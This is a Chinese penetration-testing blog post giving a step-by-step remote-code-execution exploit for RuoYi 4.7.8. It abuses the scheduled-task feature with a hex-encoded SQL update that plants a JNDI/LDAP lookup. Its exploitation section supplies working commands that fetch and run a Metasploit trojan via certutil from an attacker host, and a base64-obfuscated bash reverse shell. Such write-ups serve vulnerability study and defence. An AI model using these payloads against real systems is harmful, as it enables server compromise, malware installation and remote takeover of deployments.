#  RuoYi 4.7.8 RCE漏洞   
joyboy  fly的渗透学习笔记   2024-05-26 22:58  
  
**一、免责声明：**  
  
****  
      本次文章仅限个人学习使用，如有非法用途均与作者无关，且行且珍惜；由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除整改并向您致以歉意。谢谢！  
  
  
**二、产品介绍：**  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/iaqVyfOadia6pjtJQPM1J9g5Bg2810xpvskCmtnrRS9GTemMmfJyAXmiboYx92JKXSaIalzGtCKUSANUQbcTujwsA/640?wx_fmt=png&from=appmsg "")  
  
**三、影响版本：**  
  
****  
RuoYi-v4.7.8  
  
**四、环境搭建：**  
  
****```
https://gitee.com/y_project/RuoYi/repository/archive/v4.7.8.zip
```  
  
创建数据库 ruoyi 并导入数据脚本 ry_20230706.sql，quartz.sql——  
  
idea 载入项目——找到 ruoyi-admin\src\main\resources\application-druid.yml，修改数据库配置——运行即可  
  
  
**五、漏洞复现：**  
  
****  
使用JNDI-Injection-Exploit起一个ldap服务，执行calc命令：  
```
java -jar JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar -C calc -A 192.168.1.104
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaqVyfOadia6pjtJQPM1J9g5Bg2810xpvso4nibSd1Lb3hLkIo06cH58yAl9pcUkKpamhVjCs20icKJGg2Jl6u5p0g/640?wx_fmt=png&from=appmsg "")  
  
进入后台——新建一个定时任务：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaqVyfOadia6pjtJQPM1J9g5Bg2810xpvst8xy6aOZQHlPSJWAcLwnicvW63fK33j3TiakN0SV2QSRsQUuK4B5B3hw/640?wx_fmt=png&from=appmsg "")  
  
再新建一个定时任务内容为：  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F3139322E3136382E312E3130343A313338392F646573657269616C4A61636B736F6E2729 WHERE job_id = 4;')
```  
  
其中  
invoke_target值为我们要执行的命令的hex编码，  
job_id为刚才第一次创建的定时任务的任务编号。  
```
javax.naming.InitialContext.lookup('ldap://192.168.1.104:1389/deserialJackson')
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaqVyfOadia6pjtJQPM1J9g5Bg2810xpvstxuTGA4OEAZXHrOiafNqUhBc3Mp4sJI1jOb3RCyQFuQqHxsiaAakcAbg/640?wx_fmt=png&from=appmsg "")  
  
执行一次第二次创建的任务：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaqVyfOadia6pjtJQPM1J9g5Bg2810xpvsj6YtBRE6DMHMxOhN6IqCaIUBEXFmwBMzM6r8UFjEe5tKJ8etN0RTFw/640?wx_fmt=png&from=appmsg "")  
  
发现第一次创建的任务变了：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaqVyfOadia6pjtJQPM1J9g5Bg2810xpvsO5ByzgJWzBMk6xVFYRbs9fagwYJibANUQWPFMRf8Od6XiafdGXV4HUNg/640?wx_fmt=png&from=appmsg "")  
  
然后执行第一次创建的任务即可执行命令：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaqVyfOadia6pjtJQPM1J9g5Bg2810xpvsSx09Wiaj9FKSWVEwkiaQ26x5B1Q5rRqJWf6YsC6MdonmQ74sNvibthyFA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaqVyfOadia6pjtJQPM1J9g5Bg2810xpvs6chWzpibicty6pIFscmOprO7pnQiaUQ4afzKxWcRUYwjY5Jjf5IhjKxgQ/640?wx_fmt=png&from=appmsg "")  
  
**六、漏洞利用：**  
  
windows可以使用  
certutil 下载木马到目标机然后执行  
```
java -jar JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar -C 'certutil -urlcache -split -f http://192.168.1.104:2233/msf.exe c:/msf.exe' -A '192.168.1.104'
java -jar JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar -C 'c:/msf.exe' -A '192.168.1.104'
使用一条命令没成功:
certutil -urlcache -split -f http://192.168.1.104:2233/msf.exe c:/msf.exe & c:\msf.exe
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaqVyfOadia6pjtJQPM1J9g5Bg2810xpvs6afDo9fhUf0l1CgibxQRPNY0BHpiaxtiberMHv4zJTiavDjY2rnKSmNTSw/640?wx_fmt=png&from=appmsg "")  
  
linux可以直接反弹shell：  
```
java -jar JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar -C bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTA0LzMzNDQgMD4mMQ==}|{base64,-d}|{bash,-i}' -A '192.168.1.10' 
```  
  
  
